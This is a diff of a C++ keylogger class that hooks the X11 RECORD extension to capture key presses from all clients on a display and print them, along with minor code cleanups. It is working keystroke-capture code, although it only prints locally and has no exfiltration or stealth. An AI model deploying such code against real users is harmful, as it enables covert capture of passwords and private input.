@@ -5,11 +5,12 @@
 // Login   <vianney@bouchaud.org>
 // 
 // Started on  Wed Oct  5 13:58:25 2011 Vianney Bouchaud
-// Last update Thu Oct  6 19:03:44 2011 Vianney Bouchaud
+// Last update Wed Oct 26 15:04:35 2011 Vianney Bouchaud
 //
 
-#include	<string>
-#include	"Keylogger.hpp"
+#include <string>
+#include <stdio.h>
+#include "Keylogger.hpp"
 
 Keylogger::Keylogger()
 {
@@ -23,29 +24,29 @@ Keylogger::~Keylogger()
 void		Keylogger::start()
 {
   if (!XRecordEnableContextAsync(userData.dataDisplay, recContext, eventCallback, (XPointer) &userData))
-    throw exception();
+    throw std::exception();
 }
 
 void		Keylogger::stop()
 {
   if(!XRecordDisableContext(userData.ctrlDisplay, recContext))
-    throw exception();
+    throw std::exception();
 }
 
 void		Keylogger::setupRecordExtension()
 {
   XSynchronize(userData.ctrlDisplay, True);
   if (!XRecordQueryVersion(userData.ctrlDisplay, &recVer.first, &recVer.second))
-    throw exception();
+    throw std::exception();
   recRange = XRecordAllocRange();
   if (!recRange)
-    throw exception();
+    throw std::exception();
   recRange->device_events.first = KeyPress;
   recRange->device_events.last = KeyPress;
   recClientSpec = XRecordAllClients;
   recContext = XRecordCreateContext(userData.ctrlDisplay, 0, &recClientSpec, 1, &recRange, 1);
   if (!recContext)
-    throw exception();
+    throw std::exception();
 }
 
 void		Keylogger::processData()
@@ -53,7 +54,7 @@ void		Keylogger::processData()
   XRecordProcessReplies(userData.dataDisplay);
 }
 
-bool		Keylogger::xConnect(string displayName)
+bool		Keylogger::xConnect(const std::string &displayName)
 {
   m_displayName = displayName;
   if (NULL == (userData.ctrlDisplay = XOpenDisplay(m_displayName.c_str())))
@@ -69,7 +70,7 @@ bool		Keylogger::xConnect(string displayName)
   return (true);
 }
 
-static void   Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook)
+void		Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook)
 {
   if (hook->category != XRecordFromServer)
     {
@@ -81,7 +82,7 @@ static void   Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook
   if(data->event.u.u.type == KeyPress)
     {
       int c = data->event.u.u.detail;
-      std::cout << XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0)) std::endl;
+      printf("%s\n", XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0)));
     }
   XRecordFreeData(hook);
 }
